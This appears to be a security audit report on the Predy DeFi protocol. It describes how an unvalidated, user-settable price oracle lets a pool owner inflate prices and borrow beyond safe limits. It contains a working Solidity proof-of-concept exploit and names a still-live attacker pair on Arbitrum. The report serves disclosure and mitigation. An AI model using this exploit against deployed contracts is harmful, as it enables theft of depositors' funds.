# Vulnerability details

## Summary

Malicious price oracle can be injected through either `registerPair()` or `updatePriceOracle()`. 

## Vulnerability Details

`PredyPool` does not validate address of the price oracle. And `PositionCalculator` calls into the price oracle directly [here](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/PositionCalculator.sol#L141-L143).
```
function getSqrtIndexPrice(DataType.PairStatus memory pairStatus) internal view returns (uint256 sqrtPriceX96) {
    if (pairStatus.priceFeed != address(0)) {
        return PriceFeed(pairStatus.priceFeed).getSqrtPrice();
    } ...
```
This means that an attacker can directly control the price feed for any pair they own. 

## Impact
`PredyPool`, `GammaMarket`, and `PerpMarket` are affected as they depend on the price oracle to calculate open positions.

## Proof of Concept
`PredyPool` uses the price oracle to determine safety of a vault. Attacker can force that safety check to pass.

An example attack:
1. `registerPair()` with malicious oracle. Say, USDT/USDC pair.
2. Make malicious oracle report that 1USDT = 1e9USDC.
3. `trade(1USDT)`
4. In `predySettlementCallback()`, attacker calls `take(1e9USDC)` and transfers 1USDT to PredyPool.
5. `PositionCalculator` passes vault safety checks (Attacker might need to commit some margin, but that's negligible for this example).
6. Profit!

Basically, attacker can borrow from `PredyPool` to buy stuff at inflated price.

Here's a modified `AttackCallback.t.sol` that performs this attack.
```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../pool/Setup.t.sol";

contract TestAttackCallback is TestPool {
    uint256 pairId;

    function setUp() public override {
        TestPool.setUp();

        pairId = registerPair(address(currency1), address(0), false);
        predyPool.supply(pairId, true, 1e18);
        predyPool.supply(pairId, false, 1e18);
    }

    // Our malicious oracle.
    function getSqrtPrice() external view returns (uint256 sqrtPrice) {
        return 2 ** 130;
    }

    function predySettlementCallback(
        address quoteToken,
        address baseToken,
        bytes memory settlementData,
        int256 baseAmountDelta
    ) external {
        // If currency0 has inflated price, we can borrow more than we should be able to.
        predyPool.take(true, address(this), 1e6);
        ERC20(currency0).transfer(address(predyPool), 1);
    }

    function predyTradeAfterCallback(IPredyPool.TradeParams memory, IPredyPool.TradeResult memory) external {}

    function testMaliciousOracle() public {
        // Inject ourselves as a malicious oracle.
        predyPool.updatePriceOracle(pairId, address(this));

        // Borrow currency1 from PredyPool to buy currency0 at inflated price from our own selves.
        IPredyPool.TradeParams memory tradeParams = IPredyPool.TradeParams(pairId, 0, 0, 1, bytes("0x"));
        predyPool.trade(tradeParams, bytes("0x"));
    }

    // To illustrate that attack trade is not possible without the injected oracle.
    function testRegularOracle() public {
        IPredyPool.TradeParams memory tradeParams = IPredyPool.TradeParams(pairId, 0, 0, 1, bytes("0x"));

        // Vault is not safe after this trade.
        vm.expectRevert();
        predyPool.trade(tradeParams, bytes("0x"));
    }
}
```

## Recommended Mitigation Steps
Oracles should only be configurable by the operator. Otherwise, pool owners can drain pools they own. Given that anyone can register a pair and become a pool owner, pool depositors can never trust a pool.

Side note, the pair registered for the attack on May 14 is still present in PredyPool storage. Calling `getPairStatus(3)` on PredyPool contract (using [arbiscan](https://arbiscan.io/address/0x9215748657319b17fecb2b5d086a3147bfbc8613#readProxyContract#F3), for example) shows that attacker's pool is still present and already has attacker's address as the price oracle. That pair should ideally be scraped from storage to prevent unsuspecting depositors from supplying funds to it.
